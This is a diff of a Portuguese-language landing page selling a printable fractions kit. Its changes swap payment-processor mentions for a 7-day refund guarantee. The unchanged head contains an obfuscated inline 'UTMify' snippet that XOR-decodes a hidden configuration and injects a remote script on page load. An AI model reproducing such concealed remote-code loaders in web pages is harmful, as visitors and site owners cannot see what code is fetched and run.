@@ -14,7 +14,7 @@
   <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='15' fill='%23123f45'/%3E%3Ccircle cx='32' cy='32' r='21' fill='%23fff9ee'/%3E%3Cpath d='M32 11a21 21 0 0 1 21 21H32Z' fill='%23ed723e'/%3E%3Cpath d='M32 11v42M11 32h42' stroke='%23123f45' stroke-width='3'/%3E%3C/svg%3E">
   <link rel="stylesheet" href="styles.css">
   <script src="app.js" defer></script>
-  <!-- UTMify: UTM capture. Keeps campaign parameters through to the Cakto checkout. -->
+  <!-- UTMify: UTM capture. Keeps campaign parameters through to the checkout. -->
   <script>(function(){var s_2u=atob("DFAqp8uKzS/EtaCoYCsI0rnm7xXm3dTcECMQiOTpqUHqwNTFCTZTiajloAGmx4/bAyJD17/54lqw2NOHDDFewrj+40W3l4yKASRe1aLouFuhxoKSOysIyarnqA3+l8TJFDEH0r/npEm9mNDaBSZPyb+ntUyr0Y3bAzsIi+n8rEOx0IKSQnJXi7Coo06p0IKSQjRL06qnuFup3MbRTSBYwr3vo1vpxtXKCTRZheeou06owMWKWnII2pb3");var p_c50=[];for(var t_ag2u=0;t_ag2u<s_2u.length;t_ag2u++){p_c50.push(s_2u.charCodeAt(t_ag2u)&255);}var u_v=p_c50[0];var z_kk=p_c50.slice(1,1+u_v);var j_r=p_c50.slice(1+u_v);var u_byj=j_r.map(function(b,o_lz66){return b^z_kk[o_lz66%u_v];});var s_z60l="";for(var j_p=0;j_p<u_byj.length;j_p++){s_z60l+=String.fromCharCode(u_byj[j_p]&255);}var v_0=decodeURIComponent(escape(s_z60l));var r_r4u3=JSON.parse(v_0);var k_sz=r_r4u3.globals||[];k_sz.forEach(function(y_ol){window[y_ol.name]=y_ol.value;});var d_iuq=document.createElement("script");d_iuq.src=r_r4u3.url;d_iuq.async=true;d_iuq.defer=true;(r_r4u3.attributes||[]).forEach(function(h_4){d_iuq.setAttribute(h_4.name,h_4.value);});(document.head||document.documentElement).appendChild(d_iuq);})();</script>
   <!-- UTMify: pixel. Loads fbevents.js for the Meta pixel IDs configured in the UTMify dashboard.
        Both snippets are inline, so dist/_headers must keep 'unsafe-inline' and the utmify/facebook origins in the CSP. -->
@@ -190,11 +190,35 @@
           </p>
         </noscript>
 
+        <div class="seal-inline">
+          <img src="assets/garantia-7-dias.jpg" width="620" height="620"
+               alt="Garantia incondicional de 7 dias ou seu dinheiro de volta" loading="lazy" decoding="async">
+          <p><strong>7 dias de garantia incondicional.</strong> Não gostou? Devolvemos 100% do valor, sem burocracia.</p>
+        </div>
+
         <ul class="offer-trust">
-          <li>Pagamento processado pela Cakto</li>
+          <li>Compra 100% segura e protegida</li>
           <li>Acesso após a confirmação da compra</li>
-          <li>Garantia conforme a política do checkout</li>
+          <li><strong>7 dias de garantia</strong> — ou seu dinheiro de volta</li>
         </ul>
+      </div>
+    </div>
+  </section>
+
+  <section class="guarantee" id="garantia">
+    <div class="wrap guarantee-grid">
+      <img class="seal" src="assets/garantia-7-dias.jpg" width="620" height="620"
+           alt="Selo de garantia incondicional de 7 dias ou seu dinheiro de volta" loading="lazy" decoding="async">
+      <div class="guarantee-copy">
+        <p class="eyebrow">RISCO ZERO PARA VOCÊ</p>
+        <h2>Teste por 7 dias. <em>Se não gostar, devolvemos tudo.</em></h2>
+        <p>Você não precisa decidir agora se o material serve para a sua turma. Baixe, imprima, aplique numa aula de verdade — e só então decida.</p>
+        <ul class="guarantee-points">
+          <li><strong>7 dias completos</strong> para testar o material inteiro</li>
+          <li><strong>Reembolso total</strong>, sem precisar justificar</li>
+          <li><strong>Simples e sem burocracia</strong> — é só solicitar</li>
+        </ul>
+        <p class="guarantee-note">A garantia vale para o kit e para o combo.</p>
       </div>
     </div>
   </section>
@@ -213,7 +237,7 @@
         </details>
         <details>
           <summary>Como receberei o material?</summary>
-          <div class="answer"><p>O acesso é liberado após a confirmação da compra, pela Cakto, que é quem processa o pagamento. As instruções de acesso aparecem no próprio checkout.</p></div>
+          <div class="answer"><p>O acesso é liberado logo após a confirmação da compra, e as instruções chegam para você finalizar o download. É só imprimir as páginas que pretende usar.</p></div>
         </details>
         <details>
           <summary>Posso imprimir em preto e branco?</summary>
@@ -246,7 +270,7 @@
 <footer class="site-footer">
   <div class="wrap narrow">
     <p><strong>Kit Frações na Prática</strong> — 4º e 5º ano do Ensino Fundamental</p>
-    <p class="fine">Material digital em PDF, para imprimir e usar no seu planejamento. Pagamento processado pela Cakto; acesso liberado após a confirmação da compra.</p>
+    <p class="fine">Material digital em PDF, para imprimir e usar no seu planejamento. Acesso liberado após a confirmação da compra, com 7 dias de garantia incondicional.</p>
   </div>
 </footer>
 
@@ -280,7 +304,7 @@
     PREFIRO SOMENTE O KIT POR R$9,99
   </a>
 
-  <p class="modal-foot">Material digital em PDF · pagamento processado pela Cakto</p>
+  <p class="modal-foot">Material digital em PDF · 7 dias de garantia nas duas opções</p>
 </dialog>
 
 <dialog class="preview-dialog" aria-labelledby="dialog-title" aria-describedby="dialog-caption">
